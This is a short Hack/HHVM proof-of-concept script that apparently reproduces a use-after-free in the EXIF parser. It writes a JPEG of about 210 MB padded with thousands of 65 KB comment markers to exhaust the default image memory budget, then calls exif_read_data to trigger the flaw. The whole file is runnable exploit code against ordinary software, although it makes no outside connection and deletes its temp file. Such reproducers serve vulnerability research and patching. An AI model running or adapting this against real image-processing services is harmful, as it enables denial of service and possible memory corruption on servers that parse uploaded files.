<?hh
// POC for F7: EXIF use-after-free WITHOUT special config flags
// Exhausts the default ImageMemoryMaxBytes (200MB = UploadMaxFileSize*2)
// by creating a JPEG with many large COM markers, then the next
// exif_file_sections_add IM_REALLOC/IM_MALLOC triggers the UAF.

<<__EntryPoint>>
function poc_f7_exif_uaf(): void {
  echo "=== POC F7: EXIF UAF (no config flags needed) ===\n";
  echo "Default ImageMemoryMaxBytes = UploadMaxFileSize * 2 = 200MB\n";


  // Each COM marker holds up to 65533 bytes of data.
  // ~3200 markers × 65KB ≈ 210MB, exceeding the default 200MB limit.
  // The EXIF parser adds every marker to file.list via exif_file_sections_add,
  // which calls IM_MALLOC for each marker's data.
  // When m_mallocSize + next_alloc > 200MB, IM_REALLOC or IM_MALLOC fails → UAF.


  $marker_data_size = 65533;
  $target_bytes = 210 * 1024 * 1024;
  $num_markers = (int)ceil($target_bytes / $marker_data_size);


  echo "Creating $num_markers COM markers × $marker_data_size bytes = " .
       (int)($num_markers * $marker_data_size / 1024 / 1024) . " MB\n";


  $tmpfile = tempnam(sys_get_temp_dir(), 'f7_');
  $fh = fopen($tmpfile, 'wb');


  // SOI
  fwrite($fh, "\xFF\xD8");


  // APP1 with minimal EXIF header + IFD
  $exif_body = build_minimal_exif();
  $app1_len = strlen($exif_body) + 2;
  fwrite($fh, "\xFF\xE1");
  fwrite($fh, pack('n', $app1_len));
  fwrite($fh, $exif_body);


  // Write many COM markers to exhaust image memory budget
  $com_data = str_repeat("\x41", $marker_data_size);
  $com_header = "\xFF\xFE" . pack('n', $marker_data_size + 2);


  for ($i = 0; $i < $num_markers; $i++) {
    fwrite($fh, $com_header);
    fwrite($fh, $com_data);
    if ($i % 500 === 0 && $i > 0) {
      echo "  Written $i / $num_markers markers...\n";
    }
  }


  // EOI
  fwrite($fh, "\xFF\xD9");
  fclose($fh);


  $file_size_mb = (int)(filesize($tmpfile) / 1024 / 1024);
  echo "Created test JPEG: $tmpfile ({$file_size_mb} MB)\n";


  echo "Calling exif_read_data (this may take a moment)...\n";
  try {
    $exif = exif_read_data($tmpfile, '', true, false);
    if ($exif !== false) {
      echo "EXIF parsed without crash\n";
    } else {
      echo "EXIF returned false (no crash)\n";
    }
  } catch (\Exception $e) {
    echo "Exception: " . $e->getMessage() . "\n";
  }


  echo "Cleaning up...\n";
  unlink($tmpfile);
  echo "Done\n";
}

function build_minimal_exif(): string {
  $exif_header = "Exif\x00\x00";
  $byte_order = "II";
  $tiff_magic = pack('v', 42);
  $ifd_offset = pack('V', 8);


  $ifd_count = pack('v', 1);
  $tag = pack('v', 0x0100);
  $type = pack('v', 3);
  $count = pack('V', 1);
  $value = pack('V', 1);
  $next_ifd = pack('V', 0);


  return $exif_header . $byte_order . $tiff_magic . $ifd_offset .
         $ifd_count . $tag . $type . $count . $value . $next_ifd;
}
